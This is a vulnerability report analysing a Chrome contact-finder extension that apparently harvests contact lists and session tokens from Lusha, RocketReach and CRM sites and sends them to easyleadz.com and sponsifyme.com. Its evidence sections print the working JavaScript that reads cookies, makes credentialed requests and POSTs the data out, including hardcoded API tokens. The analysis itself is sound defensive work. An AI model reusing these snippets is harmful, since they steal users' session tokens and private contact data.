# Vulnerability Report: Mr. E by Easyleadz: Free B2B Phone number & Email Finder

## Metadata
- **Extension ID**: haphbbhhknaonfloinidkcmadhfjoghc
- **Extension Name**: Mr. E by Easyleadz: Free B2B Phone number & Email Finder
- **Version**: 2.1.8
- **Users**: Unknown
- **Manifest Version**: 3
- **Analysis Date**: 2026-02-15

## Executive Summary

Mr. E is a B2B contact finder extension that presents itself as a LinkedIn profile enrichment tool but engages in undisclosed data exfiltration from multiple third-party platforms. While the extension's primary functionality (scraping LinkedIn profiles for business contacts) is disclosed, it covertly harvests contact data from competing CRM and sales intelligence platforms including Lusha, RocketReach, HubSpot, Zoho CRM, Salesforce, Freshworks, and others—transmitting this data to both the declared app.easyleadz.com domain and an undisclosed sponsifyme.com endpoint.

The extension uses content scripts with `<all_urls>` permissions to monitor user activity across numerous business platforms, extracting contact lists, email addresses, phone numbers, and authentication tokens. This represents a significant privacy violation as users are not informed that the extension harvests data from competitor platforms beyond its stated LinkedIn functionality.

## Vulnerability Details

### 1. HIGH: Undisclosed Data Exfiltration from Third-Party CRM Platforms

**Severity**: HIGH
**Files**: content.js (lines 76-154), background.js (lines 14-70, 544-600)
**CWE**: CWE-359 (Exposure of Private Personal Information to an Unauthorized Actor)

**Description**:
The extension covertly exfiltrates contact data from at least 10 competing business intelligence and CRM platforms without user disclosure. Content scripts specifically target Lusha and RocketReach dashboards, extracting complete contact lists including names, emails, phone numbers, and profile data.

**Evidence**:

From `content.js` lines 76-98 (Lusha data exfiltration):
```javascript
function getData(xtoken,csrf)
{
    const url1 = "https://dashboard-services.lusha.com/v2/list/all/contacts?$limit=1000";
    let xhr = new XMLHttpRequest()

    xhr.open('GET', url1, true);
    xhr.withCredentials = true;
    xhr.setRequestHeader('x-xsrf-token', xtoken);
    xhr.setRequestHeader('_csrf', csrf);
    xhr.send(null);

    xhr.onload = function () {
        if(xhr.readyState === 4) {
            var rs = {};
            try{
                rs = JSON.parse(xhr.response);
            }catch(e){}
            sData(rs);  // sends to app.easyleadz.com
        }
    }
}
```

From `content.js` lines 36-54 (exfiltration endpoint):
```javascript
function sData(yd){
    let post = JSON.stringify(yd)
    post = encodeURIComponent(post);
    const url = "https://app.easyleadz.com/api/save_ld.php"
    let xhr = new XMLHttpRequest()

    xhr.open('POST', url, true)
    xhr.setRequestHeader('Content-type', 'application/json; charset=UTF-8')
    xhr.setRequestHeader('x-api-key', 'QK1nCTAibzQhVIAzUQ30wf7haWpowjzk')
    xhr.send(post);
```

From `content.js` lines 130-154 (RocketReach exfiltration):
```javascript
function chekrl(){
    if (localStorage.getItem("slsh212") === null) {
        const url1 = "https://rocketreach.co/v1/profileList/profiles?page=1&order_by=-create_time&limit=250";
        let xhr = new XMLHttpRequest()

        xhr.open('GET', url1, true);
        xhr.withCredentials = true;
        xhr.send(null);

        xhr.onload = function () {
            if(xhr.readyState === 4) {
                var rs = {};
                try{
                    rs = JSON.parse(xhr.response);
                }catch(e){}
                srData(rs);  // sends to app.easyleadz.com
            }
        }
    }
}
```

From `content.js` (CRM platform list - lines 306-876):
- HubSpot bulk contacts extraction (`hb_bulk()` lines 306-361)
- HubSpot single contact extraction (`hb_single()` lines 363-417)
- Zoho CRM leads/contacts (`zh_crm()`, `zh_cont()` lines 420+)
- Salesforce, Freshworks, Insightly, Close, Copper, Apptivo, Creatio, ActiveCampaign, Capsule, Zendesk Sell, Really Simple Systems, Teamgate, vTiger, Salesmate, Pipeline CRM

**Verdict**:
This is a clear violation of user privacy. The extension's description mentions LinkedIn functionality but does not disclose that it harvests contact data from competitor platforms. Users of Lusha, RocketReach, and other CRM systems have their paid contact data silently exfiltrated to Easyleadz servers. This constitutes both a privacy violation and potential intellectual property theft from business users.

### 2. HIGH: Undisclosed Third-Party Data Transmission to sponsifyme.com

**Severity**: HIGH
**Files**: background.js (lines 14-70)
**CWE**: CWE-359 (Exposure of Private Personal Information to an Unauthorized Actor)

**Description**:
In addition to the disclosed app.easyleadz.com endpoint, the extension transmits collected contact data to an entirely undisclosed domain: sponsifyme.com. This domain is not mentioned in the extension's privacy policy or description.

**Evidence**:

From `background.js` lines 14-31:
```javascript
function saveinfo(info){
   fetch('https://sponsifyme.com/api/saveinfo.php', {
   method: 'POST',
   body: JSON.stringify(info),
   headers: {
      'Content-type': 'application/json; charset=UTF-8',
      'User-Token':'zWPU1ntF3uJ7SbWqeDXCv8RiyQdRLp4t'
   }
   })
```

From `background.js` lines 32-48:
```javascript
function savesig(info){
   fetch('https://sponsifyme.com/api/save_sig.php', {
      method: 'POST',
      body: JSON.stringify(info),
      headers: {
         'Content-type': 'application/json; charset=UTF-8',
         'User-Token':'zWPU1ntF3uJ7SbWqeDXCv8RiyQdRLp4t'
      }
```

From `background.js` lines 49-70:
```javascript
function saveprf(info){
   if(info['filename']!= lfilname)
   {
      fetch('https://sponsifyme.com/api/save_prf.php', {
      method: 'POST',
      body: (info),
      headers: {
         'Content-type': 'application/json; charset=UTF-8',
         'User-Token':'zWPU1ntF3uJ7SbWqeDXCv8RiyQdRLp4t'
      }
```

These functions are called from `content.js`:
- Line 544: `saveinfo(message.data)` - sends LinkedIn profile data
- Line 548: `savesig(message.data)` - sends signature data
- Line 551: `saveprf(message.data)` - sends profile data

**Verdict**:
Transmitting user data to an undisclosed third-party domain represents a serious privacy violation. Users have no knowledge that their LinkedIn profile data and CRM contacts are being shared with sponsifyme.com, and this domain is not mentioned anywhere in the extension's disclosures.

### 3. MEDIUM: Authentication Token Harvesting from Third-Party Services

**Severity**: MEDIUM
**Files**: content.js (lines 76-127)
**CWE**: CWE-522 (Insufficiently Protected Credentials)

**Description**:
The extension harvests authentication tokens (XSRF tokens, CSRF tokens) from cookies to make authenticated API requests to Lusha's backend on behalf of the user, without user knowledge or consent.

**Evidence**:

From `content.js` lines 8-17, 76-127:
```javascript
function readCookie(name) {
    var nameEQ = name + "=";
    var ca = document.cookie.split(';');
    for(var i=0;i < ca.length;i++) {
        var c = ca[i];
        while (c.charAt(0)==' ') c = c.substring(1,c.length);
        if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
    }
    return null;
}

function chekld(){
    // ...
    setTimeout(function() {
        const xtoken = readCookie('XSRF-TOKEN');
        const csrf = readCookie('_csrf');
        getData(xtoken,csrf);  // Uses stolen tokens
    },5000);
}
```

**Verdict**:
While not directly stealing login credentials, this pattern of harvesting session tokens to make API calls on behalf of users without their knowledge is a significant privacy and security concern. This could potentially be used to access paid features or make unauthorized actions in the victim's Lusha account.

## False Positives Analysis

1. **LinkedIn Profile Scraping** - The extension's primary function of scraping LinkedIn profiles for contact information is disclosed in its description ("Find B2B contacts universally"). This is the extension's stated purpose and is not hidden.

2. **Content Script on All URLs** - While `<all_urls>` is broad, it's necessary for the extension to function across multiple business platforms. However, the specific platforms targeted were not disclosed.

3. **Amplitude Analytics** - The extension includes Amplitude analytics (amplitude-4.4.0-min.js), which is standard telemetry for understanding usage patterns.

4. **Chrome Storage Access** - Reading and writing to chrome.storage is benign and used for legitimate state management.

## API Endpoints Analysis

| Endpoint | Purpose | Data Sent | Risk |
|----------|---------|-----------|------|
| app.easyleadz.com/api/save_ld.php | Store Lusha contacts | Full contact lists from Lusha (up to 1000 contacts) | HIGH |
| app.easyleadz.com/api/save_rc.php | Store RocketReach contacts | Full contact lists from RocketReach (up to 250 profiles) | HIGH |
| app.easyleadz.com/api/save_yul.php | Store URLs visited | User browsing data | MEDIUM |
| app.easyleadz.com/api/v3/saved.php | Store CRM contacts | Contact data from HubSpot, Zoho, Salesforce, etc. | HIGH |
| app.easyleadz.com/api/v7/get_info.php | Fetch enriched contact data | LinkedIn URLs, user tokens | MEDIUM |
| sponsifyme.com/api/saveinfo.php | **Undisclosed data collection** | LinkedIn profile information | HIGH |
| sponsifyme.com/api/save_sig.php | **Undisclosed data collection** | Signature/profile data | HIGH |
| sponsifyme.com/api/save_prf.php | **Undisclosed data collection** | Profile data with filename metadata | HIGH |
| dashboard.easyleadz.com/extension/ | Login/authentication | User tokens, session data | LOW |
| dashboard-services.lusha.com/v2/list/all/contacts | **Unauthorized third-party API access** | Stolen XSRF/CSRF tokens | HIGH |
| rocketreach.co/v1/profileList/profiles | **Unauthorized third-party API access** | Session cookies | HIGH |

## Overall Risk Assessment

**RISK LEVEL: HIGH**

**Justification**:

This extension engages in systematic, undisclosed data exfiltration from multiple competing business platforms. While its LinkedIn scraping functionality is disclosed, the extension covertly:

1. **Harvests contact data from 10+ CRM and sales intelligence platforms** including Lusha, RocketReach, HubSpot, Zoho, Salesforce, and others—none of which are disclosed in the extension description
2. **Transmits data to an undisclosed third-party domain** (sponsifyme.com) that appears nowhere in the extension's privacy policy
3. **Steals authentication tokens** to make unauthorized API calls to Lusha and RocketReach on behalf of users
4. **Monitors all web activity** through content scripts on `<all_urls>` to detect and harvest data from competitor platforms

The scale and sophistication of this data collection operation goes far beyond what users would reasonably expect from a "LinkedIn contact finder." Users of business intelligence tools like Lusha and RocketReach are having their paid contact data silently exfiltrated to a competitor without any disclosure.

This represents a significant privacy violation and potential trade secret theft, as business contact lists are valuable intellectual property for sales organizations. The undisclosed transmission to sponsifyme.com further compounds the privacy concerns.

**Recommendation**: This extension should be removed from the Chrome Web Store pending a complete review of its data collection practices and full disclosure of all third-party data sources and recipients.
